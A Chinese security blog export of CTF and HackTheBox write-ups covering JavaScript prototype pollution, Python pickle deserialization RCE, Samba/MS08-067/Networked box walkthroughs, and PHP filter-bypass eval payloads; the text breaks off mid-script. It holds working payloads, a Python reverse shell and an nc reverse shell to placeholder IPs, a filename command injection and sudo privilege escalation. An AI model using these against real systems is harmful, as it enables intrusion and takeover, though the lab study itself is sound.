不过这样就导致了个问题，当创建多个实例的时候，实际上会开辟多个内存空间，而这个函数其实是相同的，这样就会浪费内存空间。所以每个对象(函数/类)都有一个prototype属性，指向该构造函数的原型对象。这个原型对象的所有属性和方法，都会被构造函数的实例继承。所以可以这么写： 123456A.prototype.kind = &quot;human&quot;A.prototype.goodbye = function()&#123; console.log(&#x27;goodbye&#x27;); &#125;a.kind //humana.goodbye() //goodbye 那么这里a变量作为一个实例，成功调用了A类中的goodbye方法，说明它们之间是有一定联系的。这个联系就是每个实例都有一个__proto__属性(可以自己console.log看)，内容是类的原型，也就是说实例的__proto__和类的prototype相当于两个指向同一个地址的指针，默认情况a.__proto__ === A.prototype。所以实例可以访问类里面的属性和方法。查找顺序是先查看对象自己的方法，没有再找构造函数的prototype中的方法。每个对象都有__proto__属性指向它的原型，构造函数A的原型对象的__proto__指向Object函数的原型，也就是A.prototype.__proto__ === Object.prototype，感觉和python中的object差不多，所有类的基类。这就是JavaScript中的原型链，a -&gt; A.prototype -&gt; Object.prototype -&gt; null这条链是靠__proto__/prototype属性来连接的，所以修改实例的__proto__中的属性就可能修改原型对象的属性，比如： 12345678a.__proto__.foo = &quot;test&quot; //和A.prototype.foo = &quot;test&quot;等价a.foo //test如果修改了原型的话，新的实例的原型会改变。A.prototype = &#123;ccc:123&#125; //赋值只能为对象类型，本质上也相当于改变一个指针的指向，并没有真正修改A的原型var a2 = new A(&#x27;a2&#x27;,10)a2.ccc //123a.ccc //undefineda2.__proto__ === a.__proto__ //false 网上的例子一般是用一个简单对象做例子，但这样的话它的构造函数就是Object，Object的原型(好像)是只能添加值不能修改的，所以可能会把人弄懵 123456var o1 = &#123;&#125; //等价于 var o1 = new Object()Object.prototype.foo = &quot;test&quot;var o2 = &#123;&#125;o2.foo //testObject.prototype = &#123;aaa:123&#125; //不会生效o2.aaa //undefined 所以这个漏洞可能出现的场景就是在可以修改实例对象属性的时候修改实例的__proto__属性。比如merge、clone、copy等操作。先来一个简单点的版本： 1234567891011var pro = &#x27;__proto__&#x27; //利用字符串a[pro].lalala = &#x27;lalala&#x27;b = new A(&#x27;b&#x27;,10)//新建一个同类对象b.lalala //lalala 说明污染了类原型var keys = [&#x27;a&#x27;,&#x27;__proto__&#x27;]//利用数组for(let i in keys)&#123; if(keys[i] === &#x27;__proto__&#x27;)&#123;//防止添加多余的属性，看着麻烦 a[keys[i]] = &#123;hahaha:&#x27;hahaha&#x27;&#125; &#125;&#125;b.hahaha //hahaha 因为本质是只需要一个叫做”__proto__“的字符串，所以字符串和数组都很正常，但是当使用对象类型的时候就会出现问题 12345678910let o1 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;for(let key in o1)&#123; console.log(key) //a、b&#125;console.log(Object.keys(o1)) // Array [ &quot;a&quot; ]let o2 = &#123;a:1,b:2&#125;for(let key in o2)&#123; console.log(key) //a、b&#125; 也就是说”__proto__“这个键在实例化的时候就自动解析了(参考https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Object_initializer)，把o1的\\_\\_proto\\_\\_属性指向了{b: 2}这个对象。这里其实o1只有a一个属性，只是用for语句遍历的时候会把原型链上的b也打印出来，用Object.keys()可以忽略原型链中的属性。所以为了使对象具有真正的__proto__属性，不能直接用字面量创建对象，一般选择用JSON.parse(‘{“a”: 1, “__proto__“: {“b”: 2}}’)创建对象。还可以用var obj3 = { a : 1 , [“__prot” + “o__“]: {k : 123} };这种。不过还是json解析对象的更常见。要验证这个漏洞，最简单的验证方法就是尝试修改Object类的原型，直白的想法就这么写 123456789101112131415var o3 = &#123;&#125; // o.__proto__ === Object.prototypevar obj3 = &#123; a : 1 , [&quot;__prot&quot; + &quot;o__&quot;]: &#123;k : 123&#125; &#125;for(let key in obj3)&#123; if(key === &#x27;__proto__&#x27;)&#123; for(let key2 in obj3[key])&#123; o3[key][key2] = obj3[key][key2] &#125;&#125; else&#123; o3[key] = obj3[key] &#125;&#125;o3.k //123on = &#123;&#125;on.k //123 注意不能直接写o3[key] = obj3[key]这种，因为这样的话就相当于o3[‘__proto__‘] = {k:123}，这只是修改了o3这个对象的__proto__属性不再指向Object.prototype了，而不是修改了Object.prototype。必须要再深入一层来给Object.prototype添加属性才能实现原型污染。当然上边的只是便于理解的验证写法，实际上有个很接近的函数就是merge，它会递归复制属性，正好实现了上边的两层for循环： 123456789101112131415function merge(target, source) &#123; for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] = source[key] &#125; &#125;&#125;let o1 = &#123;&#125;let o2 = JSON.parse(&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;)merge(o1, o2)console.log(o1.a, o1.b)o3 = &#123;&#125;console.log(o3.b) //2 这也就是实际中lodash的漏洞出现的位置。另外原型对象中还有一个constructor属性可以利用，它的值就是构造函数本身，也就是A.prototype.constructor === A。所以有 12345o = &#123;&#125;Object.prototype.constructor === Object //trueo.__proto__.constructor === Object //trueo.__proto__.constructor.prototype === Object.prototype //trueo.constructor.prototype === Object.prototype //true 注意到最后一种写法没有利用__proto__字段就获取到了Object的原型，可以绕过一些过滤。实际上o是没有constructor这个属性的，本质上还是利用了o.__proto__.constructor。所以在递归遍历属性的时候可以用{“constructor”: {“prototype”: {“a0”: true}}}这种payload至于攻击例子看参考链接里的吧，都挺详细的。 如何预防冻结原型-使用Object.freeze (Object.prototype)。对JSON输入进行模式验证。避免使用不安全的递归合并功能。使用没有原型的对象例如Object.create(null)。使用Map而不是Object。 参考链接https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.htmlhttps://www.mi1k7ea.com/2019/10/20/%E6%B5%85%E6%9E%90JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB/https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93https://hu3sky.github.io/2019/05/07/proto2/","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"python安全之pickle反序列化","slug":"python安全之pickle反序列化","date":"2020-03-09T09:48:46.000Z","updated":"2020-06-11T08:52:50.000Z","comments":true,"path":"2020/03/09/python安全之pickle反序列化/","link":"","permalink":"http://yoursite.com/2020/03/09/python%E5%AE%89%E5%85%A8%E4%B9%8Bpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"前两天抗疫ctf有道pickle反序列化的题，印象里好多次碰见这个知识点了，但也就是大概了解，因为感觉上就是比赛会见到。但总之总结一下吧，还是挺有意思的。","text":"前两天抗疫ctf有道pickle反序列化的题，印象里好多次碰见这个知识点了，但也就是大概了解，因为感觉上就是比赛会见到。但总之总结一下吧，还是挺有意思的。和php或者java类似，python的序列化也是把类对象转化为字符串储存下来，方便传输保存等等，最开始接触这个功能是做模型训练的时候，也没想会有什么安全问题。主要是反序列化的过程，可能导致修改类或者命令执行的问题。先写一个正常的类序列化过程： 12345678910111213141516171819202122import pickleclass People: def __init__(self,name): self.name = nameblue = People(&#x27;halfblue&#x27;)ser = pickle.dumps(blue)print(ser)#py3b&#x27;\\x80\\x03c__main__\\nPeople\\nq\\x00)\\x81q\\x01&#125;q\\x02X\\x04\\x00\\x00\\x00nameq\\x03X\\x08\\x00\\x00\\x00halfblueq\\x04sb.&#x27;#py2(i__main__Peoplep0(dp1S&#x27;name&#x27;p2S&#x27;halfblue&#x27;p3sb. 这里看到python2和python3的dumps方法生成的字符串是不一样的。这是因为dumps时用的协议不同，py2的是0号协议，py3默认是3号协议，可以通过给dumps函数加一个protocol参数来自己改变，但py2只能用2以下的。这个协议可以向前兼容，也就是说我们可以手写0号类型的字符串，因为这种可读性最强。简单介绍一下序列化的原理和用到的指令码：序列化的过程其实就是维护一个栈和另一个memo(其实也是个栈，不是一定会用到)。有几个指令码是入栈的，直接举例：cos\\nsystem:向栈中压入os模块的system方法，和i操作符类似。原理是调用self.find_class(modname, name)(:向栈中压入一个标志，弹栈时使用S’whoami’:向栈中压入一个字符串whoami,和V操作符类似I10:向栈中压入一个数字10}:向栈中压入一个空dictg0:将memo中0号元素移至栈顶还有几个指令码是出栈的：0:弹出栈顶元素t:将mark和t之间的内容转化为一个tuplel:将mark和l之间的内容转化为一个lists:将}和s之间的内容转化为一个dict，一次s操作只能得到一个键值对u:将}(和u之间的内容转化为一个dict,相当于多个s操作，和d相同p0:将栈顶元素移至memo中0号b:记录栈顶state然后弹栈，记录当前栈顶inst然后弹栈，用state来更新inst然后把得到的结果压栈。更新实例的方式是call __setstate__ or __dict__.update()，build之后内存中的内容就已经改写。R:记录栈顶args然后弹栈，记录当前栈顶f然后弹栈，执行f(args)然后把得到的结果压栈用最简单的数据类型举例，看的比较清楚： 12345678910111213141516&gt;&gt;&gt; pickle.loads(b&quot;(S&#x27;hello&#x27;\\nS&#x27;bye&#x27;\\nl.&quot;)[&#x27;hello&#x27;, &#x27;bye&#x27;]&gt;&gt;&gt; pickle.loads(b&quot;(S&#x27;hello&#x27;\\nS&#x27;bye&#x27;\\nt.&quot;)(&#x27;hello&#x27;, &#x27;bye&#x27;)&gt;&gt;&gt; pickle.loads(b&quot;(&#125;(S&#x27;win_count&#x27;\\nI10\\ndt.&quot;)(&#123;&#125;, &#123;&#x27;win_count&#x27;: 10&#125;)&gt;&gt;&gt; pickle.loads(b&quot;&#125;S&#x27;a&#x27;\\nI1\\nsS&#x27;b&#x27;\\nS&#x27;x&#x27;\\ns.&quot;)#等价的几种字典存储方式&#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: &#x27;x&#x27;&#125;&gt;&gt;&gt; pickle.loads(b&quot;(dS&#x27;a&#x27;\\nI1\\nsS&#x27;b&#x27;\\nS&#x27;x&#x27;\\ns.&quot;)&#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: &#x27;x&#x27;&#125;&gt;&gt;&gt; pickle.loads(b&quot;&#125;(S&#x27;win_count&#x27;\\nI10\\nd.&quot;)&#123;&#x27;win_count&#x27;: 10&#125;&gt;&gt;&gt; pickle.loads(b&quot;&#125;(S&#x27;name&#x27;\\nS&#x27;rua&#x27;\\nS&#x27;grade&#x27;\\nS&#x27;www&#x27;\\nu.&quot;)&#123;&#x27;name&#x27;: &#x27;rua&#x27;, &#x27;grade&#x27;: &#x27;www&#x27;&#125;&gt;&gt;&gt; pickle.loads(b&quot;&#125;(Vname\\nVrua\\nVgrade\\nVwww\\nu.&quot;)&#123;&#x27;name&#x27;: &#x27;rua&#x27;, &#x27;grade&#x27;: &#x27;www&#x27;&#125; 手写比较麻烦的化还可以用https://xz.aliyun.com/t/7012这个工具所以我们就可以修改类的属性和值，直接替换对应的部分就可以了，比如给上面那个People类改个属性名再改个值： 1234567891011ser2 = &#x27;&#x27;&#x27;(i__main__Peoplep0(dp1S&#x27;nick&#x27;p2S&#x27;bluehalf&#x27;p3sb.&#x27;&#x27;&#x27;s = pickle.loads(ser2)print(s.nick) #bluehalf 这是直接修改为字符串的，其实也可以调用其他模块的内容，比如同目录有个secret.py，内容是name=’testsecret’,那么修改PVM码： 123456789101112ser2 = &#x27;&#x27;&#x27;(i__main__Peoplep0(dp1S&#x27;nick&#x27;p2csecretnamep3sb.&#x27;&#x27;&#x27;s = pickle.loads(ser2)print(s.nick) #testsecret 很直观命令执行的原理，是python中的类有一个__reduce__魔术方法，在序列化的时候使用就可以让这个类根据我们在__reduce__中指定的方式进行序列化。先走一遍正常的流程： 123456789101112131415161718192021class People: def __init__(self,name): self.name = name def __reduce__(self): return __import__(&#x27;os&#x27;).system,(&#x27;whoami&#x27;,)blue = People(&#x27;halfblue&#x27;)ser = pickle.dumps(blue,protocol=0)#结果cntsystemp0(Vwhoamip1tp2Rp3.当然也可以反弹shelldef __reduce__(self): a = &quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot; return (os.system,(a,)) 可以看到当一个类加入reduce方法后，dumps生成的内容就给类没有关系了，只和reduce方法中的返回值有关，可以把R操作符看作reduce方法的特征。所以只要把loads的内容改成上边这种形式就可以命令执行。当然这是python3，因为reduce方法是新式类才拥有的，py2中需要用class People(object),定义时继承object类才是新式类。这种只能执行一行代码，如果想执行比较复杂的代码可以用marshal类，py2正常，py3可能有bug 1234567891011121314151617import marshalimport base64def foo(): pass # Your code hereprint &quot;&quot;&quot;ctypesFunctionType(cmarshalloads(cbase64b64decode(S&#x27;%s&#x27;tRtRc__builtin__globals(tRS&#x27;&#x27;tR(tR.&quot;&quot;&quot; % base64.b64encode(marshal.dumps(foo.func_code)) 命令执行还有其他方法，比如重写__setstate__方法等等 123456ser3 = b&quot;c__main__\\nPeople\\n)\\x81&#125;(S&#x27;__setstate__&#x27;\\ncos\\nsystem\\nubS&#x27;whoami&#x27;\\nb.&quot;s = pickle.loads(ser3)&gt;&gt;&gt; pickle.loads(b&quot;(S&#x27;whoami&#x27;\\nios\\nsystem\\n.&quot;) #另一种执行命令的格式，利用i操作符INSTlaptop-43ok3dvc\\bz&gt;&gt;&gt; pickle.loads(b&quot;(cos\\nsystem\\nS&#x27;whoami&#x27;\\no.&quot;)#另一种执行命令的格式，利用o操作符laptop-43ok3dvc\\bz pickle反序列化相关的内容大概就这些，题目一般是修改实例内容满足判断条件，或者配合绕沙盒来命令执行，绕沙盒的部分太灵活就不太好总结了。 参考链接https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdfhttps://zhuanlan.zhihu.com/p/89132768https://www.anquanke.com/post/id/188981https://xz.aliyun.com/t/7012https://www.smi1e.top/%E4%BB%8Ebalsn-ctf-pyshv%E5%AD%A6%E4%B9%A0python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/https://xz.aliyun.com/t/7436","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"hackthebox环境配置及入门关卡writeup","slug":"hackthebox环境配置及入门关卡writeup","date":"2020-01-09T15:01:00.000Z","updated":"2020-02-09T15:50:18.000Z","comments":true,"path":"2020/01/09/hackthebox环境配置及入门关卡writeup/","link":"","permalink":"http://yoursite.com/2020/01/09/hackthebox%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%85%A5%E9%97%A8%E5%85%B3%E5%8D%A1writeup/","excerpt":"买了个htb会员，做一些大致的攻略。","text":"买了个htb会员，做一些大致的攻略。###环境配置htb的服务器都比较远，网络很慢，所以我把vpn文件放到了vps上，通过vps进行扫描操作，速度会比较快。为了访问web页面，在vps上用ew开了个个socks5代理，本地用sstap挂这个代理，配置10.10.10.1/24段走代理，本地就可以全局访问htb靶场机器了，蚁剑什么的都可以用。###lamelame这关得到大家一致打的低难度分，确实也比较简单。IP为10.10.10.3。首先nmap扫一下： 12345678910111213141516171819202122232425262728293031root@vultr:~/nmap/bin# nmap -sCV 10.10.10.3Starting Nmap 7.80SVN ( https://nmap.org ) at 2020-01-10 03:49 UTCNmap scan report for 10.10.10.3Host is up (0.086s latency).Not shown: 996 filtered portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.3.4|_ftp-anon: Anonymous FTP login allowed (FTP code 230)22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)| ssh-hostkey: | 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)|_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 2h30m00s, deviation: 3h32m09s, median: 0s| smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian)| Computer name: lame| NetBIOS computer name: | Domain name: hackthebox.gr| FQDN: lame.hackthebox.gr|_ System time: 2020-01-09T22:49:31-05:00| smb-security-mode: | account_used: &lt;blank&gt;| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_smb2-time: Protocol negotiation failed (SMB2) 这里看到开了ftp和samba。先上ftp看了下没有东西。搜了下ftp2.3.4和samba3.0.20都有rce漏洞。但ftp那个其实并不是所有该版本都存在，测试了一下在这台靶机并没有。所以试着利用smb的漏洞(总不能爆破ssh吧)利用的是CVE2007-2447usermap_script这个洞。可以直接msf。默认反弹的是nc的shell很难用，可以升级成metrepreter 12345search sambause exploit/multi/samba/usermap_scriptexploit -zsearch shell_to_meterpreteruse multi/manage/shell_to_meterpreter 这个方法需要msf，其实有简单的python利用脚本。在https://github.com/amriunix/CVE-2007-2447直接python usermap_script.py 10.10.10.3 445 10.10.14.x 7788收shell就行了。一样升级shell 12345678nc -lvp 7788python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;ctrl+zstty raw -echofgresetexport SHELL=bashexport TERM=xterm-256color 漏洞打完直接是root，cat两个文件就行了###Legacy这关是windows的smb，盲猜17010。扫一下 123456789101112131415161718192021222324252627282930nmap -script smb-vulns-* 10.10.10.4smb-vuln-ms08-067: | VULNERABLE:| Microsoft Windows system vulnerable to remote code execution (MS08-067)| State: LIKELY VULNERABLE| IDs: CVE:CVE-2008-4250| The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,| Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary| code via a crafted RPC request that triggers the overflow during path canonicalization.| | Disclosure date: 2008-10-23| References:| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250|_ https://technet.microsoft.com/en-us/library/security/ms08-067.aspx|_smb-vuln-ms10-054: false|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)| smb-vuln-ms17-010: | VULNERABLE:| Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)| State: VULNERABLE| IDs: CVE:CVE-2017-0143| Risk factor: HIGH| A critical remote code execution vulnerability exists in Microsoft SMBv1| servers (ms17-010).| | Disclosure date: 2017-03-14| References:| https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143|_ https://technet.microsoft.com/en-us/library/security/ms17-010.aspx 旧xp，显示08067和17010都有，开msf打吧。但是msf的17010好像打不了xp，所以用08067。很简单不细细写了。不行就重启靶机。 ###networked一样先扫一下，开了80，有个空白网站。扫一下目录发现backup目录，里面有备份源码的tar包。解压后大概看一下，有个上传功能。过滤了后缀并检测了mime。但这个服务器存在apache解析配置错误，就是httpd.conf里存在AddHandler php5-script .php这一行，会导致所有名字里有.php的文件都会按php解析。所以上传个test.php.gif内容为GIF8就可以。之后在photos.php里面找到地址，蚁剑连上就有了第一个shell。这个shell用户是apache所以不能直接看user.txt。看到guly目录下还有个crontab 1*/3 * * * * php /home/guly/check_attack.php 内容是每三分钟调用另一个check_attack.php。 1234567891011121314151617181920212223242526272829303132333435&lt;?phprequire &#x27;/var/www/html/lib.php&#x27;;$path = &#x27;/var/www/html/uploads/&#x27;;$logpath = &#x27;/tmp/attack.log&#x27;;$to = &#x27;guly&#x27;;$msg= &#x27;&#x27;;$headers = &quot;X-Mailer: check_attack.php\\r\\n&quot;;$files = array();$files = preg_grep(&#x27;/^([^.])/&#x27;, scandir($path));foreach ($files as $key =&gt; $value) &#123; $msg=&#x27;&#x27;; if ($value == &#x27;index.html&#x27;) &#123; continue; &#125; #echo &quot;-------------\\n&quot;; #print &quot;check: $value\\n&quot;; list ($name,$ext) = getnameCheck($value); $check = check_ip($name,$value); if (!($check[0])) &#123; echo &quot;attack!\\n&quot;; # todo: attach file file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX); exec(&quot;rm -f $logpath&quot;); exec(&quot;nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;&quot;); echo &quot;rm -f $path$value\\n&quot;; mail($to, $msg, $msg, $headers, &quot;-F$value&quot;); &#125;&#125;?&gt; 这个文件的功能是删除不符合命名格式的图片，本意是防止攻击。但是第二个exec里面很明显有个命令注入，构造一个恶意文件名来弹个shell。linux文件名可以有空格，所以在uploads目录下 1touch &#x27;xxx;nc -c bash 10.10.14.x 7788;.php&#x27; 创建一个恶意文件，等待crontab触发就接收到shell。收到guly用户的shell后就可以cat user.txt了。之后提权root。先sudo -l看下发现(root) NOPASSWD: /usr/local/sbin/changename.sh，看一下这个脚本 123456789101112131415161718192021#!/bin/bash -pcat &gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;&lt; EoFDEVICE=guly0ONBOOT=noNM_CONTROLLED=noEoFregexp=&quot;^[a-zA-Z0-9_\\ /-]+$&quot;for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do echo &quot;interface $var:&quot; read x while [[ ! $x =~ $regexp ]]; do echo &quot;wrong input, try again&quot; echo &quot;interface $var:&quot; read x done echo $var=$x &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-gulydone /sbin/ifup guly0 就是把网卡配置输入写到ifcfg-guly这个文件中，然后ifup启动这个网卡。搜了下发现https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f这里提到了这个bug，当用户可以修改ifcfg文件时会导致代码执行。但官方认为这不是个bug，因为网卡本来就是只有root能操作的，只是算个配置问题。其实这里就是把输入写进文件然后source了一下，但source就是有这个特性。先在本地试下： 12echo some=asd id &gt; examplesource ./example 会发现id命令执行了。这个bug也是利用这个特性提权 123456789101112131415161718[guly@networked ~]$ sudo /usr/local/sbin/changename.shinterface NAME:aaa idinterface PROXY_METHOD:aaa whoamiinterface BROWSER_ONLY:aaa pwdinterface BOOTPROTO:aaa dateuid=0(root) gid=0(root) groups=0(root)root/etc/sysconfig/network-scriptsFri Jan 10 09:10:29 CET 2020uid=0(root) gid=0(root) groups=0(root)root/etc/sysconfig/network-scriptsFri Jan 10 09:10:29 CET 2020ERROR : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization. 可以看到whoami已经是root。这里比较奇怪的是每个命令都执行了两次,并且执行的路径在/etc/sysconfig/network-scripts，那么看下ifup的代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#!/bin/bash# Network Interface Configuration System# Copyright (c) 1996-2009 Red Hat, Inc. all rights reserved.## This program is free software; you can redistribute it and/or modify# it under the terms of the GNU General Public License, version 2,# as published by the Free Software Foundation.## This program is distributed in the hope that it will be useful,# but WITHOUT ANY WARRANTY; without even the implied warranty of# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the# GNU General Public License for more details.## You should have received a copy of the GNU General Public License# along with this program; if not, write to the Free Software# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.unset WINDOW # defined by screen, conflicts with our usage. /etc/init.d/functionscd /etc/sysconfig/network-scripts. ./network-functions[ -f ../network ] &amp;&amp; . ../networkCONFIG=$&#123;1&#125;[ -z &quot;$&#123;CONFIG&#125;&quot; ] &amp;&amp; &#123; echo $&quot;Usage: ifup &lt;configuration&gt;&quot; &gt;&amp;2 exit 1&#125;need_config &quot;$&#123;CONFIG&#125;&quot;[ -f &quot;$&#123;CONFIG&#125;&quot; ] || &#123; echo $&quot;$0: configuration for $&#123;1&#125; not found.&quot; &gt;&amp;2 echo $&quot;Usage: ifup &lt;configuration&gt;&quot; &gt;&amp;2 exit 1&#125;if [ $&#123;UID&#125; != 0 ]; then if [ -x /usr/sbin/usernetctl ]; then source_config if /usr/sbin/usernetctl $&#123;CONFIG&#125; report ; then exec /usr/sbin/usernetctl $&#123;CONFIG&#125; up fi fi echo $&quot;Users cannot control this device.&quot; &gt;&amp;2 exit 1fisource_config#后面不重要 可以看到最开始加载了/etc/sysconfig/network-scripts下的network-functions，并且代码里调用了两处source_config函数，那么看一下network-functions中的这个函数 1234567source_config ()&#123; CONFIG=$&#123;CONFIG##*/&#125; DEVNAME=$&#123;CONFIG##ifcfg-&#125; . /etc/sysconfig/network-scripts/$CONFIG #后面不重要&#125; 这里就很简单了，source_config其实就是source了这个ifcfg-guly文件，导致了代码执行。ifup中调用了两次这个函数，所以上面的脚本命令执行了两次。","categories":[],"tags":[]},{"title":"php花式绕过技巧","slug":"php花式绕过技巧","date":"2019-11-19T14:29:02.000Z","updated":"2020-04-20T02:43:20.000Z","comments":true,"path":"2019/11/19/php花式绕过技巧/","link":"","permalink":"http://yoursite.com/2019/11/19/php%E8%8A%B1%E5%BC%8F%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/","excerpt":"记录一些比赛中经常有php的花式绕过命令执行，每次这种题都会有非预期解法，php确实是最好的语言。","text":"记录一些比赛中经常有php的花式绕过命令执行，每次这种题都会有非预期解法，php确实是最好的语言。###byteCTF boring_code + 上海大学生网络安全赛 decade 123456789101112131415161718192021222324252627282930313233&lt;?phpfunction is_valid_url($url) &#123; if (filter_var($url, FILTER_VALIDATE_URL)) &#123; if (preg_match(&#x27;/data:\\/\\//i&#x27;, $url)) &#123; return false; &#125; return true; &#125; return false;&#125;if (isset($_POST[&#x27;url&#x27;]))&#123; $url = $_POST[&#x27;url&#x27;]; if (is_valid_url($url)) &#123; $r = parse_url($url); if (preg_match(&#x27;/baidu\\.com$/&#x27;, $r[&#x27;host&#x27;])) &#123; $code = file_get_contents($url); if (&#x27;;&#x27; === preg_replace(&#x27;/[a-z]+\\((?R)?\\)/&#x27;, NULL, $code)) &#123; if (preg_match(&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code)) &#123; echo &#x27;bye~&#x27;; &#125; else &#123; eval($code); &#125; &#125; &#125; else &#123; echo &quot;error: host not allowed&quot;; &#125; &#125; else &#123; echo &quot;error: invalid url&quot;; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 前面绕ssrf的就不说了，除了买域名还可以用百度网盘生成链接，百度贴吧任意url跳转。更通用的方法是compress.zlib://data:@baidu.com/baidu.com?,payload(感觉这个应该是预期解，关于phar协议用过这个方法)然后就是一个无参数的函数嵌套正则过滤，就是类似a(b(c())b()c());的类型，并且函数名不能有下划线。题目告诉了flag在上层目录。但是直接读上层目录文件的文件感觉上只能是readfile(‘../index.php’)这种格式，一定会有参数。所以目标就是跳转到上层目录并读文件，因为dirname、getcwd、pathinfo都被过滤了，所以只能用相对路径也就是chdir(‘..’)然后readfile(end(scandir(‘.’)))这里就需要解决两个问题：1、怎么构造出..2、怎么把两个语句拼起来####构造..第一个问题的话，其实scandir会默认有两个目录.和..，所以问题变成了怎么获得.然后用next(scandir(‘.’))就有..了。而构造.又有几种想法1)chr(time())或者chr(pos(localtime()))，chr函数在数字大于256的时候会mod(256)，所以在时间为256n+46的时候就能得到’.’。2)chr(ord(strenv(crypt(time())))),crypt函数有时会在最后一位得到.，然后ord取第一位，再chr就可以了，不用像第一种方法等那么久。这里time也可以换成serialize(array())phpversion()uniqid()啥啥的，能得到个字符串就行。strrev可以换成hebrevc。3)pos(localeconv())，localeconv()第一个元素是.，用pos或者current(被禁用了)拿出来。4)floor(phpversion())得到第一位数字，用数学函数fuzz出个465)chr(strrev(uniqid()))玄学，感觉没啥可行性。明显是第三种方法更好，因为没有随机性，也不需要fuzz半天。有了.之后chdir(next(scandir(‘.’)))就可以成功去到上层目录了。####拼接语句因为chdir的返回值是true，看到true自然会想到if(true)()，这是一种方法。或者把true也就是1作为参数传进去，而且还要得到.，前面的方法里time和crypt都可以满足。第四种的phpversion也可以。整理一下几种方法的最终payload 1234if(chdir(next(scandir(pos(localeconv())))))(readfile(end(scandir(pos(localeconv())))));//ifreadfile(end(scandir(chr(ord(strrev(crypt(chdir(next(scandir(pos(localeconv())))))))))));//cryptreadfile(end(scandir(chr(time(chdir(next(scandir(pos(localeconv())))))))));//timereadfile(end(scandir(chr(ord(strrev(crypt(chdir(next(scandir(chr(ceil(sinh(tan(tan(sinh(sinh(floor(phpversion()))))))))))))))))));//math 之后上海网络安全竞赛的题和这个差不多 1234567891011121314151617&lt;?phphighlight_file(__FILE__);$code = $_GET[&#x27;code&#x27;];if (!empty($code)) &#123; if (&#x27;;&#x27; === preg_replace(&#x27;/[a-z]+\\((?R)?\\)/&#x27;, NULL, $code)) &#123; if (preg_match(&#x27;/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code)) &#123; echo &#x27;bye~&#x27;; &#125; else &#123; eval($code); &#125; &#125; else &#123; echo &quot;No way!!!&quot;; &#125;&#125;else &#123; echo &quot;No way way!!!&quot;; &#125; 过滤了更多的东西，对比一下其实就是多了readfile|if|time|local|sqrt这几个，所以看看上面的payload就只有crypt还可以用了。readfile可以用join、implode、serialize代替。当然接着用数学方法算也是可以的。。。fuzz脚本，用递归比较方便改层数，遍历后发现还是有很多种的 1234567891011121314151617181920$funcs = Array(&#x27;sin&#x27;,&#x27;cos&#x27;,&#x27;tan&#x27;,&#x27;sinh&#x27;,&#x27;cosh&#x27;,&#x27;tanh&#x27;);function helper($ch,$m,$temp)&#123; if(sizeof($temp) != 